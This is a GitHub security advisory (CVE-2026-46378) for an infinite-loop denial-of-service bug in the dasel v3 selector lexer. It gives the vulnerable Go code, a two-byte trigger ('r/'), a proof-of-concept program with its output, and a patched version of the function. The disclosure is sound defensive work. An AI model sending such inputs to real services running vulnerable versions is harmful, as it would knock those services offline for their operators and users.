# [H] Dasel: Denial of service in dasel selector lexer due to infinite loop on unterminated regex literal

## Summary
Severity: High
Advisory: GHSA-m6xr-fvfg-5g64
CVE: CVE-2026-46378
CWE: CWE-835
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-19
Source: https://github.com/advisories/GHSA-m6xr-fvfg-5g64
Type: github-advisory

## Affected
- Go: `github.com/tomwright/dasel/v3` — affected >=3.0.0 <3.10.1

## Details
### Summary

`dasel`'s selector lexer enters a non-terminating loop when tokenizing an unterminated regex pattern such as `r/abc`. A 2-byte input (`r/`) is sufficient to cause the tokenizer to consume 100% CPU on one core indefinitely.

I confirmed the issue on `v3.3.1` (`fba653c7f248aff10f2b89fca93929b64707dfc8`) and on `master` commit `0dd6132e0c58edbd9b1a5f7ffd00dfab1e6085ad`. I also verified the same code path is present in `v3.0.0` (`648f83baf070d9e00db8ff312febef857ec090a3`). No fix is available yet.

### Details

The bug is in the `matchRegexPattern` closure within `(*Tokenizer).parseCurRune` in [`selector/lexer/tokenize.go#L237-L247`](https://github.com/TomWright/dasel/blob/fba653c7f248aff10f2b89fca93929b64707dfc8/selector/lexer/tokenize.go#L237-L247):

```go
matchRegexPattern := func(pos int) *Token {
    if p.src[pos] != 'r' || !p.peekRuneEqual(pos+1, '/') {
        return nil
    }
    start := pos
    pos += 2
    for !p.peekRuneEqual(pos, '/') {  // line 243
        pos++
    }
    pos++
    return ptr.To(NewToken(RegexPattern, p.src[start+2:pos-1], start, pos-start))
}
```

When no closing `/` exists, [`peekRuneEqual`](https://github.com/TomWright/dasel/blob/fba653c7f248aff10f2b89fca93929b64707dfc8/selector/lexer/tokenize.go#L39-L43) returns `false` when `pos >= srcLen` (because the bounds check at line 40 returns `false` for out-of-range positions). Since `!false = true`, the loop condition remains true and `pos` increments indefinitely. The function never returns.

Notably, the same function already handles unterminated quoted strings by returning `UnexpectedEOFError`, but the regex pattern path does not perform a similar end-of-input check.

Minimal trigger: `r/` (2 bytes)

Test environment:

- MacBook Air (Apple M2), macOS / Darwin `arm64`
- Go `1.26.1`
- dasel `v3.3.1` (`fba653c7f248aff10f2b89fca93929b64707dfc8`)

### PoC

```go
package main

import (
	"fmt"
	"runtime"
	"time"

	"github.com/tomwright/dasel/v3/selector/lexer"
)

func main() {
	fmt.Printf("Go version: %s\n", runtime.Version())
	fmt.Printf("GOARCH: %s\n", runtime.GOARCH)
	fmt.Println()

	for _, input := range []string{"r/unterminated", "r/"} {
		fmt.Printf("Input: %s\n", input)
		done := make(chan string, 1)
		go func() {
			t := lexer.NewTokenizer(input)
			start := time.Now()
			tokens, err := t.Tokenize()
			elapsed := time.Since(start)
			if err != nil {
				done <- fmt.Sprintf("Error after %v: %v", elapsed, err)
			} else {
				done <- fmt.Sprintf("OK after %v: %d tokens", elapsed, len(tokens))
			}
		}()

		select {
		case result := <-done:
			fmt.Println(result)
		case <-time.After(5 * time.Second):
			fmt.Println("CONFIRMED: did not complete within 5s; tokenizer is stuck in non-terminating loop")
		}
		fmt.Println()
	}
}
```

Observed output on `v3.3.1` in the test environment above:

```text
Go version: go1.26.1
GOARCH: arm64

Input: r/unterminated
CONFIRMED: did not complete within 5s; tokenizer is stuck in non-terminating loop

Input: r/
CONFIRMED: did not complete within 5s; tokenizer is stuck in non-terminating loop
```

### Impact

An attacker who can control or influence the selector/query string passed to dasel can cause the tokenizer to enter a non-terminating loop. The affected process consumes 100% CPU on one core and does not make progress until externally terminated.

The selector string is typically provided by the application developer, but there are deployment scenarios where it may be attacker-influenced:
- Web applications using dasel for dynamic data querying
- Applications that construct selectors from user input
- Shared tooling environments where selectors are passed as parameters

### Suggested Fix

The regex scanner should bounds-check and return an error on unterminated regex literals, consistent with unterminated quoted strings. Since `matchRegexPattern` currently returns `*Token`, the fix also requires changing the function signature to propagate errors. For example:

```go
matchRegexPattern := func(pos int) (*Token, error) {
    if p.src[pos] != 'r' || !p.peekRuneEqual(pos+1, '/') {
        return nil, nil
    }
    start := pos
    pos += 2
    for pos < p.srcLen && p.src[pos] != '/' {
        pos++
    }
    if pos >= p.srcLen {
        return nil, &UnexpectedEOFError{Pos: pos}
    }
    pos++
    return ptr.To(NewToken(RegexPattern, p.src[start+2:pos-1], start, pos-start)), nil
}
```

## References
- https://github.com/TomWright/dasel/security/advisories/GHSA-m6xr-fvfg-5g64
- https://github.com/TomWright/dasel/commit/95f8dd3af12958bf6ca2a737b3ec0267280f86ed
- https://github.com/TomWright/dasel
